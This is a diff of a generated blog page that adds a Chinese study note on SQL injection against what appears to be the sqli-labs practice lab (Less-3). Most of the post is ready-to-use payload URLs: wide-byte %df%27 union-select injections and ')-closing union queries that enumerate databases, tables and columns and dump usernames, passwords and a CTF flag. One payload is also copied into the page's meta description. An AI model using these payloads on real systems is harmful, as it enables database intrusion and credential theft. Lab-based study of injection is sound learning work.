@@ -10,6 +10,9 @@
 
     <!--Description-->
     
+        <meta name="description" content="宽字节查数据库1http://192.168.78.174/sqli/Less-3/?id=-1%df%27) union select 1,2,group_concat(schema_name) from information_schema.schemata --+
+查表1http://192.">
+    
 
     <!--Author-->
     
@@ -40,7 +43,7 @@
 
     <!-- Title -->
     
-    <title>Archives: 2019 - 博客</title>
+    <title>博客</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -127,9 +130,7 @@
 <div class="container">
 
     <!-- Main Content -->
-    
-
-<div class="row">
+    <div class="row">
     <div class="col-sm-12">
 
         <!--Title and Logo-->
@@ -137,34 +138,61 @@
     <div class="logo">
         <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
         
-            <h1 id="main-title" class="title">2019</h1>
-        
     </div>
 </header>
 
-        <section class="main archive-container">
+        <section class="main">
             
-                <div class="archive-post">
-    <a href="/2019/04/09/hello-world/">
-        <span class="archive-date">
-            Apr 2019
-        </span>
-        Hello World
-    </a>
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2019/04/10/笔记/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-04-10</span>
+            
+            
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h1 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h1><h4 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.78.174/sqli/Less-3/?id=-1%df%27) union select 1,2,group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure>
+<h4 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.78.174/sqli/Less-3/?id=-1%df%27) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+</span><br></pre></td></tr></table></figure>
+<h4 id="查字段"><a href="#查字段" class="headerlink" title="查字段"></a>查字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.78.174/sqli/Less-3/?id=-1%df%27) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 --+</span><br></pre></td></tr></table></figure>
+<h4 id="查字段内容"><a href="#查字段内容" class="headerlink" title="查字段内容"></a>查字段内容</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.78.174/sqli/Less-3/?id=-1%df%27) union select 1,2,group_concat(id,username,password ) from users --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">5.查字段内容  --&gt; flag值</span><br><span class="line"></span><br><span class="line">union select group_concat() from &apos;字段&apos;</span><br><span class="line"></span><br><span class="line">union select 1,group_concat(id,flag) from ctf4 --+</span><br></pre></td></tr></table></figure>
+<h2 id="其他思路注入"><a href="#其他思路注入" class="headerlink" title="其他思路注入"></a>其他思路注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">课件的注入方法，正常思路注入方法</span><br></pre></td></tr></table></figure>
+<h4 id="查看显错点"><a href="#查看显错点" class="headerlink" title="查看显错点"></a>查看显错点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.any.com/sqli/Less-3/?id=1&apos;) and 1=2 union select 11,22,33 %23</span><br></pre></td></tr></table></figure>
+<h4 id="查看用户信息、数据库名称、mysql版本信息"><a href="#查看用户信息、数据库名称、mysql版本信息" class="headerlink" title="查看用户信息、数据库名称、mysql版本信息"></a>查看用户信息、数据库名称、mysql版本信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.any.com/sqli/Less-3/?id=1&apos;) and 1=2 union select 11,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),33 %23</span><br></pre></td></tr></table></figure>
+<h4 id="查看security数据库中所有表"><a href="#查看security数据库中所有表" class="headerlink" title="查看security数据库中所有表"></a>查看security数据库中所有表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.any.com/sqli/Less-3/?id=1&apos;) and 1=2 union select 1,2,unhex(hex(group_concat(table_name))) from information_schema.tables where table_schema=&apos;security&apos; %23</span><br></pre></td></tr></table></figure>
+<h4 id="查看users表中所有列"><a href="#查看users表中所有列" class="headerlink" title="查看users表中所有列"></a>查看users表中所有列</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.any.com/sqli/Less-3/?id=1&apos;) and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; and table_schema=&apos;security&apos; %23</span><br></pre></td></tr></table></figure>
+<h4 id="查看所有列的值"><a href="#查看所有列的值" class="headerlink" title="查看所有列的值"></a>查看所有列的值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.any.com/sqli/Less-3/?id=1&apos;) and 1=2 union select 1,2,group_concat(id,&apos; &apos;,username,&apos; &apos;,password) from security.users %23</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+
+    
+
+    <!-- Comments -->
+    
+
 </div>
-            
-                <div class="archive-post">
-    <a href="/2019/04/10/笔记/">
-        <span class="archive-date">
-            Apr 2019
-        </span>
-        Untitled
-    </a>
-</div>
-            
         </section>
+
     </div>
 </div>
+
 
 </div>
 
